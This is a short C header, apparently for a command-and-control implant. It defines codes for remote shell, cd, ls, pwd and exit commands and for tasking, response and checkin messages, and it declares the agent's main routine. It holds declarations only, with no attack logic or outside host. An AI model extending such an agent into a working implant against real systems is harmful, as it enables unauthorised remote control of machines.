#pragma once

#ifndef COMMAND
#define COMMAND

#include <string>
#include "Globals.h"
#include "Parser.h"
#include "Package.h"
#include "WrapCd.h"
#include "WrapShell.h"
#include "WrapLs.h"
#include "WrapPwd.h"
#include "WrapExit.h"

#define SHELL_CMD 0x54
#define CD_CMD 0x55
#define LS_CMD 0x56
#define PWD_CMD 0x57
#define EXIT_CMD 0x58

#define GET_TASKING 0x00
#define POST_RESPONSE 0x01
#define CHECKIN 0xf1

#define NUMBER_OF_TASKS 1

// Declare the global variable
extern char currentDirecotry[MAX_PATH_SIZE];

BOOL routine();
BOOL parseCheckin(PParser ResponseParser);

#endif